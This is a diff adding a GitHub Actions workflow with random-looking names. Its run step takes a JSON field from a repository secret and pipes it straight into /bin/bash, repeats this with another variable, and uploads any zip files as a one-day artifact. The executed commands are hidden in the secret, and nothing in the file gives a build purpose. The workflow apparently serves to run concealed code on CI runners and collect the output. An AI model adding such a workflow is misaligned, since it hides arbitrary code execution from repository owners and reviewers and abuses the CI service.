@@ -1,0 +1,22 @@
+name: firebasehi6699
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: firebasehi6699
+        env:
+          ljyi68: ${{ secrets.ljyi68 }}
+        run: |
+          printf '%s' "$ljyi68" | jq -r .acvwu9 | /bin/bash
+          echo $mvkmh584 | jq -r .ww6 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nnh3wP8O
+          path: "*.zip"
+          retention-days: 1
